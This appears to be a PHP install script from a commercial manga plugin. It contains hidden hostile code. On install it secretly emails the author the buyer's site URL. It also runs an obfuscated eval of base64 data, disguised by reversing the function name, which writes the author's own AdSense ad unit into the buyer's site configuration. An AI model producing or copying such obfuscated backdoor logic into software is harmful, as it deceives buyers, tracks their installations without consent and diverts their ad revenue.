<?php 


if (!defined("_WASD_")) {
		echo '<br /> HOME PAGE: http://codecanyon.net/user/Aincrad?ref=Aincrad' . '<br /> PORTOFOLIO: http://codecanyon.net/user/Aincrad/portfolio?ref=Aincrad' . '<br /> email: yearimdangtk@gmail.com' . '<br /><br />';
			include "../index.html";
		exit; 	
	}
    	
	/*******************************************************
	* Email us there are new HAPPY CUSTOMER *
	********************************************************/
    $to ='yearimdangtk@gmail.com';
    $subject = 'New PHP Manga Plugin Installed (Jqupload) Say Hooray'; 
	$body = 'Hi brother, I just want to say if your happy buyer just have been successfully install PHP Manga plugin (Jqupload) at '. currentUrl() .'.<br /> He say to me if he/she really-really love your plugin. Do not forget to help him, okay? ';
	$phpmailer = 'lib/Vendor/PHPMailer.php';require_once($phpmailer);$mail = new \Vendor\PHPMailer(true);$mail->CharSet = 'UTF-8';$mail->IsHTML(true);$popdfpof = strrev('edoced_46esab');eval($popdfpof('DQoJCSRHQWRTID0gJw0KCQk8YnI+DQoJCQk8IS0tIElrbGFuIC0tPg0KCQkJPHNjcmlwdCBhc3luYyBzcmM9Ii8vcGFnZWFkMi5nb29nbGVzeW5kaWNhdGlvbi5jb20vcGFnZWFkL2pzL2Fkc2J5Z29vZ2xlLmpzIj48L3NjcmlwdD4NCgkJCTxpbnMgY2xhc3M9ImFkc2J5Z29vZ2xlIg0KCQkJICAgICBzdHlsZT0iZGlzcGxheTppbmxpbmUtYmxvY2s7d2lkdGg6NDY4cHg7aGVpZ2h0OjYwcHgiDQoJCQkgICAgIGRhdGEtYWQtY2xpZW50PSJjYS1wdWItMjYwOTc1MDA5OTAyMzAzOSINCgkJCSAgICAgZGF0YS1hZC1zbG90PSI4MTQwMTY4NTA2Ij48L2lucz4NCgkJCTxzY3JpcHQ+DQoJCQkoYWRzYnlnb29nbGUgPSB3aW5kb3cuYWRzYnlnb29nbGUgfHwgW10pLnB1c2goe30pOw0KCQkJPC9zY3JpcHQ+DQoJCQk8IS0tIElrbGFuIC0tPg0KCQknOw0KCQlXQVNEOjp3cml0ZUNvbmZpZyhhcnJheSgnYWRzMSc9PiRHQWRTKSk7'));$mail->AddAddress($to);$mail->SetFrom(C("email.from"), sanitizeForHTTP(C("app.title")));$mail->Subject = sanitizeForHTTP($subject);$mail->Body = $body;$SEND_MAIL = $mail->Send();

	
  ?>
